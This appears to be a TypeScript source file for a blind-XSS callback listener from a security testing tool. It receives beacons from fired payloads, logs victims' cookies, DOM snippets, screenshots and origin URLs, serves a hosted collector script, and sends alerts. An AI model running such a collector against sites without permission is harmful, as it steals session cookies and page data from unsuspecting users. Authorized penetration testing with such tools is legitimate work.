import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { DataCollector } from './data-collector.js';
import { CallbackPayloadGenerator } from './payload-generator.js';
import { NotificationManager } from './notification.js';
import { createLogger } from '../../utils/logger.js';

const logger = createLogger('callback-server');

export interface CallbackServerOptions {
  host?: string;
  port?: number;
  dataDir: string;
  /** Public base URL payloads point at (https://callback.example.com). */
  publicBase: string;
  notifier?: NotificationManager;
  /** Called for every hit — the API process wires this into its DB. */
  onHit?: (hit: ReturnType<DataCollector['record']>) => void;
}

/**
 * Standalone blind-XSS callback listener.
 *
 *   GET /c/:token?d=<json>   — beacon from an executed payload (image request)
 *   GET /p/:token.js         — hosted collector script for src= short payloads
 *   GET /health              — liveness probe
 *
 * Deploy on an isolated host (never alongside production client sites).
 */
export class CallbackServer {
  private server?: Server;
  private readonly collector: DataCollector;
  private readonly generator: CallbackPayloadGenerator;

  constructor(private readonly opts: CallbackServerOptions) {
    this.collector = new DataCollector(opts.dataDir);
    this.generator = new CallbackPayloadGenerator(opts.publicBase);
  }

  async start(): Promise<void> {
    const host = this.opts.host ?? '0.0.0.0';
    const port = this.opts.port ?? 5001;

    this.server = createServer((req, res) => void this.handle(req, res));
    await new Promise<void>((resolve) => this.server!.listen(port, host, resolve));
    logger.info({ host, port }, 'blind-XSS callback server listening');
  }

  async stop(): Promise<void> {
    await new Promise<void>((resolve) => this.server?.close(() => resolve()));
  }

  private async handle(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`);

    if (url.pathname === '/health') {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true, hits: this.collector.list(1).length }));
      return;
    }

    const beaconMatch = url.pathname.match(/^\/c\/([A-Za-z0-9_-]+)$/);
    if (beaconMatch?.[1]) {
      await this.recordHit(beaconMatch[1], url, req, res);
      return;
    }

    const scriptMatch = url.pathname.match(/^\/p\/([A-Za-z0-9_-]+)\.js$/);
    if (scriptMatch?.[1]) {
      res.writeHead(200, {
        'content-type': 'application/javascript',
        'cache-control': 'no-store',
        'access-control-allow-origin': '*',
      });
      res.end(this.generator.hostedScript(scriptMatch[1], true));
      return;
    }

    res.writeHead(404, { 'content-type': 'text/plain' });
    res.end('not found');
  }

  private async recordHit(
    token: string,
    url: URL,
    req: IncomingMessage,
    res: ServerResponse,
  ): Promise<void> {
    let data: Record<string, string> = {};
    const encoded = url.searchParams.get('d');
    if (encoded) {
      try {
        data = JSON.parse(decodeURIComponent(encoded)) as Record<string, string>;
      } catch {
        try {
          data = JSON.parse(encoded) as Record<string, string>;
        } catch {
          data = {};
        }
      }
    }

    const hit = this.collector.record({
      token,
      originUrl: data['u'],
      referer: data['r'] ?? req.headers.referer,
      userAgent: data['ua'] ?? req.headers['user-agent'],
      cookies: data['c'],
      location: data['u'],
      title: data['t'],
      domSnippet: data['dom'],
      screenshot: data['shot'],
      remoteAddr: req.socket.remoteAddress,
    });

    logger.warn({ token, origin: hit.originUrl }, 'blind XSS payload fired');

    await this.opts.notifier?.notify({
      kind: 'blind-xss-triggered',
      scanId: hit.scanId ?? 'untracked',
      message: `Blind XSS payload fired!\nOrigin: ${hit.originUrl ?? 'unknown'}\nTitle: ${hit.title ?? ''}`,
      url: hit.originUrl,
      timestamp: hit.receivedAt,
    });

    this.opts.onHit?.(hit);

    // 1x1 transparent GIF so the beacon renders "successfully".
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
      'content-type': 'image/gif',
      'cache-control': 'no-store',
      'access-control-allow-origin': '*',
    });
    res.end(gif);
  }
}
